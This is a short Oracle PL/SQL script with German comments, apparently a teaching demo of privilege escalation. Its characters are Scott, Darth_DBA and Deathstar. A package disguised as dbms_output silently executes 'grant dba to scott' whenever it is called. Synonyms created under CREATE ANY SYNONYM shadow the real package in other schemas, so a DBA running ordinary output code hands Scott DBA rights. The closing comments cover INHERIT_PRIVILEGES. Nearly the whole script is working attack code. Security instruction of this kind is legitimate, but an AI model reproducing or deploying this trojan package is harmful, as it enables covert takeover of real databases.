-- Scott
create or replace package malicious_dbms_output authid current_user as
	procedure put_line( i_input varchar2 );
end;
/

create or replace package body malicious_dbms_output as

  procedure grant_us_dba
  as
    pragma autonomous_transaction;
    begin
      execute immediate 'grant dba to scott';
      sys.dbms_output.put_line('Granting succeeded!'); -- Diese würden im echten Fall natürlich ausgelassen!
    exception when others then
      sys.dbms_output.put_line('Granting DBA not succeeded: ' || sqlerrm); -- Diese würden im echten Fall natürlich ausgelassen!
      null;
    end;

  procedure put_line( i_input varchar2 )
  as
    begin
      grant_us_dba();
      sys.dbms_output.put_line(i_input);
    end;
end;
/

grant execute on malicious_dbms_output to public;

-- Prüfe aktuelle Rechte
select * from user_role_privs;

-- Hey DBA - ich bräuchte bitte CREATE ANY SYNONYM privilege weil tolles neues framework
-- User: DARTH_DBA
grant create any synonym to scott;

-- User: SCOTT
create synonym deathstar.dbms_output for malicious_dbms_output;
create synonym darth_dba.dbms_output for malicious_dbms_output;

-- User: Deathstar - Da funktioniert nichts, aber es wird auch nichts bemerkt
select room_info.get_room_id('Vader') from dual;

-- User: DARTH_DBA: uiuiuiui...
declare
  l_room_id integer;
begin
	l_room_id := deathstar.room_info.get_room_id('Vader');
	dbms_output.put_line('ID: ' || l_room_id);
end;
/

-- User: Scott...
-- Prüfe aktuelle Rechte
select * from user_role_privs;

-- Warum wird grant dba nicht von INHERIT_PRIVILEGES gestoppt?
-- User DARTH_DBA wurde manuell angelegt und anschließend mit
--    grant dba to darth_dba with admin option;
-- DBA-Rechte gegeben.
-- Für Benutzer, die manuell angelegt werden und keine Standard Oracle-Benutzer sind,
-- muss INHERIT_PRIVILEGES extra ausgeführt werden